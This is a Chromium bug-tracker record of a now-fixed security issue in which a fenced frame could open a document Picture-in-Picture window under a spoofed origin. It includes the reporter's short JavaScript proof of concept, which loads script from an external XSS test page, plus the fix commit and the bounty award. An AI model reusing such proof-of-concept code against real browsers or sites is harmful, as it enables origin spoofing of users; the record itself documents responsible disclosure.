# Fenced frame spoof documentPictureInPicture

| Field | Value |
|-------|-------|
| **Issue ID** | [40062954](https://issues.chromium.org/issues/40062954) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media>PictureInPicture |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | nd...@protonmail.com |
| **Assignee** | st...@chromium.org |
| **Created** | 2023-02-07 |
| **Bounty** | $4,000.00 |

## Description

Flags:
chrome://flags/#document-picture-in-picture-api
chrome://flags/#privacy-sandbox-ads-apis
chrome://flags/#enable-fenced-frames

f=document.createElement('fencedframe');
f.src='https://terjanq.me/xss.php?h[Supports-Loading-Mode]=fenced-frame&js=onclick=()=>documentPictureInPicture.requestWindow();';
document.body.appendChild(f)

Click the fenced frame.

Opens documentPictureInPicture with the origin of 'https://terjanq.me' but security UI still displays the top URL.

PiP is blank therefore not currently aware of any security impact.
Hopefully this is safe from a compromised renderer :/

## Timeline

### li...@google.com (2023-02-07)

thanks for filing this!

### li...@google.com (2023-02-07)

[Empty comment from Monorail migration]

### li...@google.com (2023-02-07)

[Empty comment from Monorail migration]

### th...@chromium.org (2023-02-15)

Per crbug/1416350, restricting visibility.

### dr...@chromium.org (2023-03-15)

Setting Bug-Security so that this gets triaged

### [Deleted User] (2023-03-15)

[Empty comment from Monorail migration]

### ts...@chromium.org (2023-03-16)

Looks like the link in the original description has changed so DNR. Finding appropriate owner with that caveat. 
Might be related to https://crbug.com/1418549

Setting desktop platforms, please adjust.

### [Deleted User] (2023-03-17)

steimel: Uh oh! This issue still open and hasn't been updated in the last 37 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### st...@chromium.org (2023-03-18)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-19)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-04-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/ec37e94452ab5895037151dd5088b4e47dba1e90

commit ec37e94452ab5895037151dd5088b4e47dba1e90
Author: Tommy Steimel <steimel@chromium.org>
Date: Thu Apr 06 19:00:39 2023

pip2: Don't allow fencedframes to open document PiP windows

This CL prevents fencedframes from opening document PiP windows since
only the topmost frame should ever open a document PiP window.

Bug: 1413813
Change-Id: I240804eae59fa44258e4e89be77045b38a4b2e4c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4354681
Reviewed-by: Frank Liberato <liberato@chromium.org>
Commit-Queue: Tommy Steimel <steimel@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1127317}

[modify] https://crrev.com/ec37e94452ab5895037151dd5088b4e47dba1e90/third_party/blink/renderer/modules/document_picture_in_picture/document_picture_in_picture.cc
[add] https://crrev.com/ec37e94452ab5895037151dd5088b4e47dba1e90/third_party/blink/web_tests/wpt_internal/fenced_frame/document-picture-in-picture-denied.https.html


### st...@chromium.org (2023-04-07)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-07)

Dear owner, thanks for fixing this bug. We’ve reopened it because security bugs need Security_Severity and FoundIn labels set, which will enable the bots to request merges to the correct branches ( as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact (security@chromium.org) to arrange to set these labels and then this bug can be marked closed again. Thank you! Severity guidelines: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues FoundIn guidelines: https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security Thanks for your time! 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### nd...@protonmail.com (2023-04-11)

This needs FoundIn label :)
Or merge it with https://bugs.chromium.org/p/chromium/issues/detail?id=1416350

### st...@chromium.org (2023-04-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-11)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2023-04-13)

I think this can now be marked as Fixed.
DOMException: Failed to execute 'requestWindow' on 'DocumentPictureInPicture': Opening a PiP window is only allowed from a top-level browsing context

### st...@chromium.org (2023-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-13)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-20)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-04-20)

Congratulations, NDevTK! The VRP Panel has decided to award you $4,000 for this report. Thank you for your efforts and reporting this issue to us! 

### nd...@protonmail.com (2023-04-20)

Thanks :)

### am...@google.com (2023-04-24)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-05-25)

[Empty comment from Monorail migration]

### am...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### pg...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-07-20)

This issue was migrated from crbug.com/chromium/1413813?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/1269059, crbug.com/chromium/1382964]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062954)*
